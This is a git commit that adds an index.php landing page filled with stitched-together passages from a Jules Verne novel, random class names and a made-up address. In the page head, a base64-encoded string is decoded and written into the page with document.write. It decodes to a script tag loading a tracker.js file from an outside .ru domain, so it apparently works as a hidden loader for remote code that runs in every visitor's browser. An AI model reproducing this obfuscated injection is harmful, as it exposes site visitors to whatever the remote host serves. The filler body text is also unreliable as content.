f80602f1392dd7beccf98b18e03117fc2bd56f57
ooywuwwc <77590724+ooywuwwc@users.noreply.github.com>
2021-01-17 23:32:15 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>The fishing over, the Nautilus neared the coast. About here a number of sea-turtles w</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9sNzQydmNmdjV0aHl0YW5sMDciPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="3ams3323nu9kxohqawdc3vjc">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="#">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="rhid2dmeakz69ula9k">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>The fishing over, the Nautilus neared the coast. About here a number of sea-turtles w</h1>
+	</section>
+
+
+	<section class="our-work" class="6fs1rr5p16l2rbwxj">
+		<h3 class="title">And so much the better for us, replied Ned Land. Th</h3>
+		<p>While I was contemplating this inert mass, a dozen of these voracious beasts appeared round the boat; and, without noticing us, threw themselves upon the dead body and fought with one another for the pieces. However, on the 26th, appeased by some presents, and understanding that they had no reprisals to fear, they led M. Jacquireot to the scene of the wreck. At a few minutes to nine, I put my ear to the captain's door. No noise. I left my room and returned to the saloon, which was half in obscurity, but deserted. At this point indicated on the planisphere one of these currents was rolling, the Kuro-Scivo of the Japanese, the Black River, which, leaving the Gulf of Bengal where it is warmed by the perpendicular rays of a tropical sun, crosses the Straits of Malacca along the coast of Asia, turns into the North Pacific to the Aleutian Islands, carrying with it trunks of camphor-trees and other indigenous productions, and edging the waves of the ocean with the pure indigo of its warm water. It was this current that the Nautilus was to follow. I followed it with my eye; saw it lose itself in the vastness of the Pacific, and felt myself drawn with it, when Ned Land and Conseil appeared at the door of the saloon.</p>
+		<hr>
+
+		<ul class="grid" class="se6adzqni6tmmfg91">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="3ams3323nu9kxohqawdc3vjc">
+		<h3 class="title">We returned through the forest, and comple</h3>
+		<p>The engineer was again called. This terrible scene of the 20th of April none of us can ever forget. I have written it under the influence of violent emotion. Since then I have revised the recital; I have read it to Conseil and to the Canadian. They found it exact as to facts, but insufficient as to effect. To paint such pictures, one must have the pen of the most illustrious of our poets, the author of The Toilers of the Deep. You may speak, said the captain. This man does not understand French. We must ask Captain Nemo, said Conseil.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="rhid2dmeakz69ula9k" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="se6adzqni6tmmfg91" class="title">By what name ought I to address you?</h3>	
+		<p>I can still see Captain Nemo's position. Holding himself well together, he waited for the shark with admirable coolness; and, when it rushed at him, threw himself on one side with wonderful quickness, avoiding the shock, and burying his dagger deep into its side. But it was not all over. A terrible combat ensued. Only one observation-just one. The occasion must be serious, and our first attempt must succeed; if it fails, we shall never find another, and Captain Nemo will never forgive us. The quay of Brooklyn, and all that part of New York bordering on the East River, was crowded with spectators. Three cheers burst successively from five hundred thousand throats; thousands of handkerchiefs were waved above the heads of the compact mass, saluting the Abraham Lincoln, until she reached the waters of the Hudson, at the point of that elongated peninsula which forms the town of New York. Then the frigate, following the coast of New Jersey along the right bank of the beautiful river, covered with villas, passed between the forts, which saluted her with their heaviest guns. The Abraham Lincoln answered by hoisting the American colors three times, whose thirty-nine stars shone resplendent from the mizzen-peak; then modifying its speed to take the narrow channel marked by buoys placed in the inner bay formed by Sandy Hook Point, it coasted the long sandy beach, where some thousands of spectators gave it one final cheer. The escort of boats and tenders still followed the frigate, and did not leave her until they came abreast of the light-ship whose two lights marked the entrance of New York Channel. Captain Nemo was awaiting me.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="3ams3323nu9kxohqawdc3vjc">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="rhid2dmeakz69ula9k"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="6fs1rr5p16l2rbwxj"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="se6adzqni6tmmfg91"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>056 Shanahan Cliffs, Suite 009, 05260-9987, New Darrickton, North Carolina, United States</p>
+	</footer>
+
+</body>
+
+</html>
